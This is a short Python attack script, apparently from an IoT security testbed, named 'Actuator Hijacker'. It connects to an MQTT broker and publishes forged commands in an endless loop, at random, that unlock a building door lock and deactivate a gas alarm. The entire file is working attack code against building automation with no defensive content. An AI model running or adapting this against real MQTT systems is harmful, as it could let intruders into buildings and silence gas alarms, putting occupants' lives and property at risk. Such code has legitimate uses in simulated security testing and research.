import os
import time
import json
import random
import paho.mqtt.client as mqtt

BROKER = os.getenv("BROKER_ADDRESS", "mqtt-broker")
ATTACK_INTERVAL = float(os.getenv("ATTACK_INTERVAL", 5))  # seconds

client = mqtt.Client()
client.connect(BROKER)
print(f"[Actuator Hijacker] Connected to MQTT broker at {BROKER}")

def send_fake_command(topic, command):
    payload = {
        "action": command,
        "timestamp": time.time()
    }
    client.publish(topic, json.dumps(payload))
    print(f"[Hijack] Sent to {topic}: {payload}")

# Targets
door_topic = "building/zone1/door/lock"
gas_alarm_topic = "building/zone3/alarm/control"

while True:
    topic = random.choice([door_topic, gas_alarm_topic])
    command = "unlock" if topic == door_topic else "deactivate"
    send_fake_command(topic, command)
    time.sleep(ATTACK_INTERVAL)
